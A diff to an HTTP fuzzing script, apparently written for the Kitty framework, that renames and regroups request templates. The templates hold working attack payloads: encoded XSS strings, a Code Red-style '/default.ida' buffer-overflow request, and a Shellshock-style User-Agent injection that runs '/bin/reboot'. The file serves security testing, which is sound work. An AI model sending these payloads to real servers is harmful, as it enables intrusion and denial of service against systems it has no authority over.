@@ -33,7 +33,9 @@ PORT=2017
 URL="http://"+HOST
 
 #==================================================================
-# Models
+# Basic Models
+
+
 http_get_01 = Template(name='HTTP_GET_01', fields=[
     String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
@@ -79,10 +81,13 @@ http_post_01 = Template(name='HTTP_POST_01', fields=[
     Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
 ])
 
-#==================================================================
-# Request- URI
 
-http_req_01 = Template(name='HTTP_REQ_01', fields=[
+
+#==================================================================
+# Path
+
+
+http_path_01 = Template(name='HTTP_PATH_01', fields=[
     String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
     Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
@@ -97,7 +102,7 @@ http_req_01 = Template(name='HTTP_REQ_01', fields=[
 
 
 
-http_req_02 = Template(name='HTTP_req_02', fields=[
+http_path_02 = Template(name='HTTP_PATH_02', fields=[
 	String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
 	Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
 	String('/dir', name='path1'),
@@ -120,10 +125,6 @@ http_req_02 = Template(name='HTTP_req_02', fields=[
 	Delimiter(' ', name='space3'),
 	String(URL, name='host1'), 
 ])
-#==================================================================
-# Path
-
-
 
 
 
@@ -209,28 +210,28 @@ http_xss_05 = Template(name='HTTP_XSS_05', fields=[
 	String('</script>\n', name='xss4'),
     Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
     String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),   
-	String('Host: ', name='host'),
-	String(URL, name='url'),
-	Delimiter('\r\n\r\n', name='eom3'),
-	String('Content-type: ', name='ctypeh'),
-	String('text/html', name='ctype'),
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
+	String('Host: ', name='host', fuzzable=False),
+	String(URL, name='url', fuzzable=False),
+	Delimiter('\r\n\r\n', name='eom3', fuzzable=False),
+	String('Content-type: ', name='ctypeh', fuzzable=False),
+	String('text/html', name='ctype', fuzzable=False),
 	Delimiter('\r\n\r\n', name='eom4'),
 ])
 
 
 http_xss_06 = Template(name='HTTP_XSS_06', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
     String('/sample.action?', name='path'),     # 2. Path - a string with the value "/index.html" 
 	String('myinput=%fc%80%80%80%80%a2%fc%80%80%80%80%bE%FC%80%80%80%80%BC%FC%80%80%80%81%B7%FC%80%80%80%81%A8%FC%80%80%80%81%B3%FC%80%80%80%81%A3%FC%80%80%80%81%A8%FC%80%80%80%81%A5%FC%80%80%80%81%A3%FC%80%80%80%81%AB%FC%80%80%80%80%BE%fc%80%80%80%80%bCscript%fc%80%80%80%80%bEalert%fc%80%80%80%80%a81%fc%80%80%80%80%a9%fc%80%80%80%80%bC%fc%80%80%80%80%aFscript%fc%80%80%80%80%bE', name='xss1'),
 	String('<script>\n', name='xss2'),
 	String("registerStatistics('searchTerm', '');\n", name='xss3'),
 	String('</script>\n', name='xss4'),
     Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),   
-	String('Host: ', name='host'),
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
+	String('Host: ', name='host', fuzzable=False),
 	String(URL, name='url'),
 	Delimiter('\r\n\r\n', name='eom3'),
 	String('Content-type: ', name='ctypeh'),
@@ -238,16 +239,33 @@ http_xss_06 = Template(name='HTTP_XSS_06', fields=[
 	Delimiter('\r\n\r\n', name='eom4'),
 ])
 #==================================================================
-
+# Overflow 
 http_ovf_01 = Template(name='HTTP_OVF_01', fields=[
-    String('GET', name='method'),           # 1. Method - a string with the value "GET"
-    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
-    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
+    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
+    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
+    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
 	String('?myinput=%fc%80%80%80%80%a2%fc%80%80%80%80%bE%FC%80%80%80%80%BC%FC%80%80%80%81%B7%FC%80%80%80%81%A8%FC%80%80%80%81%B3%FC%80%80%80%81%A3%FC%80%80%80%81%A8%FC%80%80%80%81%A5%FC%80%80%80%81%A3%FC%80%80%80%81%AB%FC%80%80%80%80%BE%fc%80%80%80%80%bCscript%fc%80%80%80%80%bEalert%fc%80%80%80%80%a81%fc%80%80%80%80%a9%fc%80%80%80%80%bC%fc%80%80%80%80%aFscript%fc%80%80%80%80%bE', name='xss'),
-    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
-    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
-    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
+    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
+    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
+    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
 ])
+
+
+http_ovf_02 = Template(name='HTTP_OVF_02', fields=[
+	Static('GET /default.ida?', name='method file'), String('NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNv', name='padding'),
+	Static(' HTTP/1.1\r\n\r\n', name='protocol name'),
+])
+
+#========================================================================
+# Code Injection
+http_shell_01 = Template(name='http_shell_01', fields=[
+	String('GET / HTTP/1.1', name='method', fuzzable=False),
+	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
+	String('HTTP_USER_AGENT=() { :; }; /bin/', name='host', fuzzable=False),
+	String('reboot', name='baststuff'),
+])
+ 
+
 
 
 
@@ -326,18 +344,8 @@ apache_killer = Template(name='apache_killer', fields=[
 
 
 
-#========================================================================
-http_shell_01 = Template(name='http_shell_01', fields=[
-	String('GET / HTTP/1.1', name='method', fuzzable=False),
-	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
-	String('HTTP_USER_AGENT=() { :; }; /bin/', name='host', fuzzable=False),
-	String('reboot', name='baststuff'),
-])
- 
-code_red = Template(name='code_red', fields=[
-	Static('GET /default.ida?', name='method file'), String('NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNv', name='padding'),
-	Static(' HTTP/1.1\r\n\r\n', name='protocol name'),
-])
+
+
 
 
 
@@ -521,7 +529,5 @@ if __name__=="__main__":
 
 
 	fuzzer.start()
-
-
 
 
